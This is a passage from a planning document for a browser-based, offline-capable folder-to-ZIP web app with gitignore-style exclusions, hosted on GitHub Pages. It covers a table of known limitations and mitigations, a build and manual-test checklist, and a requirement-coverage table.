| **In-memory path** (no save dialog: Firefox, Safari, iPhone, Firefox Android) holds the whole ZIP in RAM. Running out of memory kills the tab. That is not a catchable error, so the user would lose the job with no message. | **Hard block, not a warning.** The preview refuses to start when the included total exceeds `MEM_CAP`: **1 GiB** by default, and **400 MB** where `matchMedia('(pointer: coarse)')` matches (phones and tablets, detected by a media feature, not the user agent). The message reads: "Too big to build in this browser's memory (2.5 GB, limit 400 MB). Exclude more, or use Chrome/Edge on a computer." The input total is a safe proxy, because DEFLATE output plus headers is at most slightly larger than the input. Chunks are folded into a `Blob` every 32 MB (§5), so peak RAM is about the output size, not double. *Calibration knob:* both caps are `const`s at the top of `app.js`, chosen conservatively, not measured on every device. Raise them after testing on your own phone (§11). |
| **Button path C** enumerates excluded folders too, so it is slow on huge `node_modules` folders and empty folders aren't visible. | The hint recommends drag-and-drop on desktop. Exclusions still apply correctly. |
| **Unix permissions (e.g. executable scripts) and symlinks** aren't exposed to web pages. | Files are stored as regular files. Documented in the README. |
| **ZIP timestamps** have 2-second precision and a 1980–2099 range. | Clamped using local-time bounds, which match fflate's local-time year check (§5). |
| **Compression runs on the main thread.** | Work is chunked through `file.stream()` and awaited between chunks, so the UI stays responsive and progress updates. *Upgrade path if it feels janky: move steps 2–4 into a same-origin worker.* fflate's built-in async mode is not used because it creates workers from `blob:` URLs, which the CSP blocks. |
| **Already-compressed files** (jpg, mp4, zip) waste time being deflated. | Accepted for v1. *Upgrade path: use `ZipPassThrough` (stored, no compression) for a short list of extensions.* |
| **iPhone (and other in-memory-path) saving:** blob downloads have historically been unreliable in installed home-screen apps, and `navigator.share` needs a fresh tap. | Built in, not deferred: after zipping, the app shows **Save ZIP** (`<a download>`) and, where `navigator.canShare({files})` is true, **Share…**. On iPhone, Share → "Save to Files" works even when the download link doesn't. Each is the user's own tap, so activation is fresh (§5). |
| **The first visit needs internet,** and the browser may evict the offline cache of a rarely used app. | Opening it online once re-caches it, because every online fetch refreshes the cache. Nothing personal is lost, because nothing is stored. |
| **`<datalist>` is not used:** its dropdown never appears on Firefox for Android, and its look can't be styled. | The suggestion list is plain buttons (§4). It looks and behaves the same in every browser, with native keyboard and screen-reader support. |
| **Case-insensitive matching** differs from git on Linux, where `core.ignorecase` defaults to false. A project that has both `Build/` and `build/` loses both to `build/`. | Accepted. Such projects are rare, the result errs toward excluding, and the "Skipped" preview lists exactly what was dropped. *Upgrade path: a "Match case" checkbox.* |
| **Rule changes on a huge folder** re-walk it before Compress is available again. | The preview shows "Updating…" and the button stays disabled until the walk finishes. Correctness wins over a few seconds. Pruning keeps re-walks fast on paths A and B, and path C only re-filters in memory. |
| **Dropping several items, or a file,** is refused with "Drop one folder." | To zip several folders, put them in one folder first. |
| **Free GitHub Pages requires a public repo.** | Fine for this app, which contains no secrets. |
| **Pages project sites of one account share one origin** (and so share offline caches). | Host on a dedicated free organization site (§8, §11). If you deploy as a project site on your personal account anyway, the security boundary widens to every Pages repo on that account: keep none of them loading third-party scripts. |

## 11. Build and ship checklist

1. Create a free GitHub organization used only for this app (GitHub → **+** → *New organization* → *Free*), e.g. `rish-packlight`, and in it a public repo named exactly `rish-packlight.github.io`. Host nothing else on Pages in that organization, so the app's origin is its own (§8). Turn on 2FA.
2. Add the 11 files from §3. Download fflate 0.8.3 `esm/browser.js` from npm or unpkg, save it as `fflate.js`, and verify its SHA-256 matches §8.
3. Test locally with `python3 -m http.server 8000` → `http://localhost:8000`. `localhost` counts as secure, so the service worker and folder picker work. Opening `index.html` as `file://` will **not** work.
4. Run `node ignore.test.mjs` with **Node 22.7 or newer** (or 20.19+). It must print nothing and exit with code 0. Older Node cannot load `ignore.js`'s `export` without a `package.json`. Rather than add a file, the README states the minimum. Node 18 and 20 are past end-of-life anyway, and every supported Node line (22, 24, 26) runs it as is. Check with `node --version`.
5. Test manually with a sample project containing `venv/`, `.git/`, a `Thumbs.db`, `.env`, `.env.local`, `.env.example`, a `secrets/` folder, a `logs/` folder holding `.gitkeep` and `x.log`, a nested `.gitignore` (with the lines `logs/**`, `!logs/.gitkeep` and one invalid line such as `foo[1`), a `myenv/` made with `python3 -m venv myenv` (Python 3.13+, which writes `myenv/.gitignore` = `*`; remove the `venv/` chips for this check), empty files (`__init__.py`, and `logs/.gitkeep` above), a non-ASCII filename, an empty folder and a file dated before 1980 (`touch -t 197001010000 old.txt`):
   - Check the preview counts and the "1 ignored: invalid" note.
   - Unzip the result and confirm the excluded items are absent, `myenv/` contributes nothing while `src/` and `README.md` are present, the empty files are present at 0 bytes, `logs/.gitkeep` is present, the structure is intact and the names are correct.
   - Add the chip `thumbs.db` (lower case) and confirm `Thumbs.db` moves to "Skipped".
   - **Race test:** add the chip `secrets/` and click Compress immediately. The button must be disabled ("Updating…") until the preview refreshes, and the ZIP must not contain `secrets/`.
   - **Stale-ZIP test (Firefox or Safari, in-memory path):** compress, wait for **Save ZIP**, then add the chip `secrets/`. Save ZIP and Share… must disappear at once and the status must read "Rules changed. Compress again."
   - With the toggle off, confirm `.env` and `.env.local` are both under "Skipped" by default. Then tap `!.env.example` and confirm `.env.example` moves into the ZIP.
   - In the exclude box, type `build-notes` and confirm no `build/` chip appears. Then tap `build/` in the suggestion list and confirm it does. **Do this click/tap test in Safari desktop and on iPhone, not only Chrome** (the browsers that don't focus clicked buttons), and add three chips in a row by tapping. Check `↓`/`↑`/`Enter` work with the keyboard alone in Safari.
   - Drop two folders, then a single file, onto the drop zone. Each must show "Drop one folder." and change nothing.
   - **Drop, then change rules (Chrome, Firefox and Safari desktop):** drop the folder, add a chip, and confirm the preview refreshes and Compress re-enables. Then compress and confirm the ZIP is correct. If a browser fails, it must show "Drop or choose it again" rather than hang on "Updating…", and the in-memory-tree fallback in §5 adapter B becomes required.
   - **Unreadable file:** after the preview, delete one file (or, in a OneDrive folder, mark one "Free up space" and go offline), then Compress. The ZIP must still be made, without that file, and the yellow panel must name it.
   - **Memory cap:** on Firefox or Safari, pick a folder over 1 GiB (over 400 MB on a phone). Compress must be blocked with the "Too big" message. To calibrate, raise the phone cap step by step on your own iPhone until the tab dies, then set it at half that.
   - Test once each in Chrome (button and drop), Firefox, Safari, Android Chrome, **Firefox Android** and iPhone Safari, both in the browser and installed. On every one, confirm the suggestion list appears and filters. On iPhone installed mode, save once through **Share… → Save to Files**.
6. Turn on Pages: repo → Settings → Pages → Deploy from branch → `main` / root. Tick **Enforce HTTPS**.
7. Open `https://rish-packlight.github.io/`, install it, switch on airplane mode, and confirm it still opens and zips.
8. Update test: deploy a visible change (e.g. footer text). Reopen the installed app online once and confirm the change shows. No cache name to bump.
9. Partial-update test: deploy another change, then in DevTools → Network block the request URL `ignore.js` and reopen the app. It must load the **previous** version intact, not a blank page. Unblock it, reopen, and confirm the new version shows.

## Requirement coverage

| Requirement | Where |
|---|---|
| Folder in, `.zip` out | §5 |
| gitignore-style exclusions (venv, .settings, …) | §6, presets in §4 |
| Searchable dropdown, multiple selections | §4 (search box + suggestion buttons + chips, works in every browser) |
| HTML/CSS on GitHub, installable on a phone like the timetable | §1, §7, §11 |
| No database, no stored data | §2, §8 |
| Completely free | §1 (GitHub Pages, MIT library, no paid services) |
| Simple, user-friendly, good design | §4 |
| Works without internet | §7 |
| Secure and actually working | §5 adapter details, §8, §9, §10, §11 tests |
| Planning only | Nothing has been built |
